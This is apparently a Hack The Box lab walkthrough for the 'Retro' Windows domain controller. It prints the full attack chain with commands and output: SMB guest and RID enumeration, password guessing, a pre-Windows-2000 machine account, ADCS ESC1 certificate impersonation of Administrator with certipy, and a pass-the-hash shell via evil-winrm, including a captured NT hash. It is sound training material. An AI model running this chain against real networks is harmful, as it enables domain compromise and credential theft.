<div align="center">
<img src="Pasted image 20250705213732.png">
</div>

### Guided Mode
### Task 1 - What is the Fully Qualified Domain Name (FQDN) of the Domain Controller in Retro?

First let's add the machine to our hosts file. 
```
echo "10.129.196.125 retro.htb" >> /etc/hosts
```

Now let's perform our nmap scan. Per my usual,
```
nmap -sV -sC -Pn -T4 10.129.196.125
```
```
`Host is up (0.12s latency).`
`Not shown: 988 filtered tcp ports (no-response)`
`PORT     STATE SERVICE       VERSION`
`53/tcp   open  domain        Simple DNS Plus`
`88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-06 01:32:43Z)`
`135/tcp  open  msrpc         Microsoft Windows RPC`
`139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn`
`389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)`
`|_ssl-date: TLS randomness does not represent time`
`| ssl-cert: Subject: commonName=DC.retro.vl`
`| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl`
`| Not valid before: 2024-10-02T10:33:09`
`|_Not valid after:  2025-10-02T10:33:09`
`445/tcp  open  microsoft-ds?`
`464/tcp  open  kpasswd5?`
`593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0`
`636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)`
`| ssl-cert: Subject: commonName=DC.retro.vl`
`| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl`
`| Not valid before: 2024-10-02T10:33:09`
`|_Not valid after:  2025-10-02T10:33:09`
`|_ssl-date: TLS randomness does not represent time`
`3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)`
`| ssl-cert: Subject: commonName=DC.retro.vl`
`| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl`
`| Not valid before: 2024-10-02T10:33:09`
`|_Not valid after:  2025-10-02T10:33:09`
`|_ssl-date: TLS randomness does not represent time`
`3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)`
`| ssl-cert: Subject: commonName=DC.retro.vl`
`| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl`
`| Not valid before: 2024-10-02T10:33:09`
`|_Not valid after:  2025-10-02T10:33:09`
`|_ssl-date: TLS randomness does not represent time`
`3389/tcp open  ms-wbt-server Microsoft Terminal Services`
`|_ssl-date: 2025-07-06T01:34:03+00:00; 0s from scanner time.`
`| rdp-ntlm-info:`
`|   Target_Name: RETRO`
`|   NetBIOS_Domain_Name: RETRO`
`|   NetBIOS_Computer_Name: DC`
`|   DNS_Domain_Name: retro.vl`
`|   DNS_Computer_Name: DC.retro.vl`
`|   Product_Version: 10.0.20348`
`|_  System_Time: 2025-07-06T01:33:23+00:00`
`| ssl-cert: Subject: commonName=DC.retro.vl`
`| Not valid before: 2025-04-08T01:55:44`
`|_Not valid after:  2025-10-08T01:55:44`
`Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows`

`Host script results:`
`| smb2-security-mode:`
`|   3.1.1:`
`|_    Message signing enabled and required`
`| smb2-time:`
`|   date: 2025-07-06T01:33:26`
`|_  start_date: N/A`

`Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .`
`Nmap done: 1 IP address (1 host up) scanned in 100.55 seconds`
`~/hackthebox/Retro >`
```

So to answer our question **task 1** DC.retro.vl
Let's add this to /etc/hosts
```
echo 10.129.196.125 DC.retro.vl >> /etc/hosts

and for safe measure,

echo 129.196.125 retro.vl >> /etc/hosts
```

#### Task 2 - What is the non-default SMB share which is readable with the guest account?

So from our nmap we can see 445 open so let's connect anonymously.
```
smbclient -L \\10.129.196.125\ 
```

<div align="center">
<img src="Pasted image 20250705215111.png">
</div>

So **task 2**: Trainees

#### Task 3: What is the account name that is referenced in `Important.txt`?

So now let's login via our anonymous account to the share

```
smbclient \\\\\\10.129.196.125\\Trainees -U 'guest'
```

<div align="center">
<img src="Pasted image 20250705215450.png">
</div>

<div align="center">
<img src="Pasted image 20250705220254.png">
</div>
... so there seems to be no clear indication of a "username" located here. Let's enumerate the smb server via rid-brute since we have guest access.

```
~ > netexec smb 10.129.234.44 -u guest -p '' --rid-brute                                  22:18:48

SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.44   445    DC               [+] retro.vl\guest:
SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)
```

So from the e-mail and seeing "trainee" here I'm going to infer that's the answer to **task 3** which is correct.

#### Task 4 - What is the trainee user's password?

So since all passwords are the same (via important.txt,) this is an easy box, and I know I've ran into admin:admin countless times, for the sake of throwing spaghetti at the wall to see what stuck, tried the password trainee... and well.. **task 5** answer is trainee

#### Task 5 - What is the name of the share that the trainee account can access that guest could not?

```
~ > nxc smb 10.129.196.125 -u trainee -p trainee --shares                                 22:33:50
SMB         10.129.196.125  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.196.125  445    DC               [+] retro.vl\trainee:trainee
SMB         10.129.196.125  445    DC               [*] Enumerated shares
SMB         10.129.196.125  445    DC               Share           Permissions     Remark
SMB         10.129.196.125  445    DC               -----           -----------     ------
SMB         10.129.196.125  445    DC               ADMIN$                          Remote Admin
SMB         10.129.196.125  445    DC               C$                              Default share
SMB         10.129.196.125  445    DC               IPC$            READ            Remote IPC
SMB         10.129.196.125  445    DC               NETLOGON        READ            Logon server share
SMB         10.129.196.125  445    DC               Notes           READ
SMB         10.129.196.125  445    DC               SYSVOL          READ            Logon server share
SMB         10.129.196.125  445    DC               Trainees        READ
```

So our answer for **task 5** is Notes. Connecting to this share will reveal our first flag.
<div align="center">
<img src="Pasted image 20250705223907.png">
</div>

Enter user.txt flag (**Task 6**) and let's read the contents of ToDo.txt
```
Thomas,

after convincing the finance department to get rid of their ancient banking software
it is finally time to clean up the mess they made. We should start with the pre-created
computer account. That one is older than me.

Best

James
```

#### Task 7 - What is the name of the old machine account that has pre-windows-2000 compatibility?

So back when we did our SMB RID cycling directly below our user Trainee was a machine named BANKING$. 

#### Task 8 - What is the error code returned when authenticating as the `BANKING machine account with the default password?

We can make a very quick inference here from our ToDo. We're given the snippet "We should perform cleanup starting with the *pre created* computer account.." coupled with ancient banking software my initial first guess was correct. Much like our user login for trainee, we've got banking\$:banking as a login. Let's test it out.

```
~/hackthebox/Retro > nxc smb 10.129.196.125 -u BANKING$ -p banking --generate-tgt ticket
SMB         10.129.196.125  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.196.125  445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
~/hackthebox/Retro > ls                                                                   00:31:35
hosts  Important.txt  nmap  test.txt  ToDo.txt  user.txt
~/hackthebox/Retro > ls                                                                   00:31:40
~/hackthebox/Retro > nxc smb 10.129.196.125 -u BANKING$ -p banking -k --generate-tgt ticket
SMB         10.129.196.125  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.196.125  445    DC               [+] retro.vl\BANKING$:banking
SMB         10.129.196.125  445    DC               [+] TGT saved to: ticket.ccache
SMB         10.129.196.125  445    DC               [+] Run the following command to use the TGT: export KRB5CCNAME=ticket.ccache
~/hackthebox/Retro > export KRB5CCNAME=ticket.ccache                                   4s 00:32:45
~/hackthebox/Retro > klist                                                                00:33:18
Ticket cache: FILE:ticket.ccache
Default principal: BANKING$@RETRO.VL

Valid starting       Expires              Service principal
07/06/2025 00:32:45  07/06/2025 10:32:45  krbtgt/RETRO.VL@RETRO.VL
        renew until 07/07/2025 00:32:44
~/hackthebox/Retro >
```

Now as for answering the question for task 8-- just a quick run of 
```
~ > smbclient //dc.retro.vl/Notes -U 'BANKING                                           00:52:44
Password for [WORKGROUP\BANKING$]:
session setup failed: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

So... **step 8: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT

#### Task 9: What is the name of the Certificate Authority (CA) Common Name (CN) that issue certificates in the Active Directory Certificate Services environment?

I had spent some time digging around for a shell before getting around to this question, but it all led back to to this. ADCS.


A run of certipy shows our vulnerability and next steps.

```
~/hackthebox/Retro > certipy find -vulnerable -k -u 'banking$@retro.vl' -no-pass -target dc.retro.vl -ns 10.129.246.172 -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

To quickly answer **task 9**--  retro-DC-CA.
#### Task 10: Retro has an ADCS template that is vulnerable to a vulnerability which can be used to exploit Certificate enrollment by requesting certificates impersonating other users. What is the specific ESC pseudo name of this vulnerability?

**Task 10:** ESC1

So the template RetroClients is our vulnerability, and leveraging our BANKING$ account, we can request a certificate for any user. The simple reason this works: BANKING$ can enroll in this template and request a SAN. One thing to note here and I've made this mistake a dozen times. In our template we can see the key size is 4096, this is going to have to be added to our next command or we'll get an error. Let's go for a quick rid brute again using banking$ to grab an SID of our target (Administrator of course,) and request a certificate. 



```
~/hackthebox/Retro > lookupsid.py -k dc.retro.vl                                          16:51:08
/home/jam3z/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250701.160936.2e87ade - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at dc.retro.vl
[*] StringBinding ncacn_np:dc.retro.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
```

We *should* know following the domain sid just tack on -500 for Administrator and we should be ready to go request admin certificate.

```
~/hackthebox/Retro > certipy req -ca retro-DC-CA -template RetroClients -k -u 'banking$@retro.vl' -target dc.retro.vl -upn 'administrator@retro.vl' -key-size 4096 -sid  S-1-5-21-2983547755-698260136-4283918172-500
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: dc.retro.vl.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: RETRO.VL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 12
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Actually took a bit of spamming and different formations of requests on this one to get it working (blaming HackTheBox on this,) but now we're ready to authenticate with our pfx and get a hash.

```
~/hackthebox/Retro > certipy auth -pfx administrator.pfx -dc-ip 10.129.246.172            17:27:14
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

Now let's just pass this over to evil-winrm, get our root flag and call it a day.

```
~/hackthebox/Retro > evil-winrm -i 10.129.246.172 -u administrator -H 252fac7066d93dd009d4fd2cd0368389
/home/jam3z/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/home/jam3z/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/8/2025   8:11 PM             32 root.txt

                                                                                                   *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
40fce9c3f09024bcab29d377ee1ed071
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

...and we've succesfully rooted Retro. 
